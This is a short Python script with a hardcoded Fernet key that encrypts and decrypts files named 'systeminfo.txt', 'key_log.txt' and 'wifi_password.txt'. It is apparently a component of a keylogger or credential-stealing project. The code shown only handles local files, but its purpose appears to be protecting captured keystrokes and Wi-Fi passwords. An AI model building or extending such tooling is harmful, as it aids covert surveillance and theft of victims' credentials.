from cryptography.fernet import Fernet
import os

# Configuration
screenshot_folder = "D:\\Python\\D.Dor\\KL\\"
decryption_key = "6Q5zfqiU_Vvpv1VLl9Kis5zFept1Ro0qubE6sjWrGfg="
fernet = Fernet(decryption_key)

# Encrypt files
def encrypt_files():
    files_to_encrypt = ["systeminfo.txt", "key_log.txt", "wifi_password.txt"]
    encrypted_files = ["e_systeminfo.txt", "e_key_log.txt", "e_wifi_password.txt"]

    for i, file_name in enumerate(files_to_encrypt):
        file_path = os.path.join(screenshot_folder, file_name)
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            encrypted_file_path = os.path.join(screenshot_folder, encrypted_files[i])
            with open(encrypted_file_path, 'wb') as ef:
                ef.write(encrypted_data)

# Decrypt files
def decrypt_files():
    encrypted_files = ["e_systeminfo.txt", "e_key_log.txt", "e_wifi_password.txt"]
    decrypted_files = []

    for encrypted_file in encrypted_files:
        encrypted_path = os.path.join(screenshot_folder, encrypted_file)
        if os.path.exists(encrypted_path):
            with open(encrypted_path, 'rb') as f:
                encrypted_data = f.read()
            decrypted_data = fernet.decrypt(encrypted_data)
            decrypted_filename = "decrypted_" + encrypted_file.replace("e_", "")
            decrypted_filepath = os.path.join(screenshot_folder, decrypted_filename)
            with open(decrypted_filepath, 'wb') as decrypted_file:
                decrypted_file.write(decrypted_data)
            decrypted_files.append(decrypted_filepath)
    
    return decrypted_files

# Main execution (if needed to test directly)
if __name__ == "__main__":
    encrypt_files()
    decrypt_files()
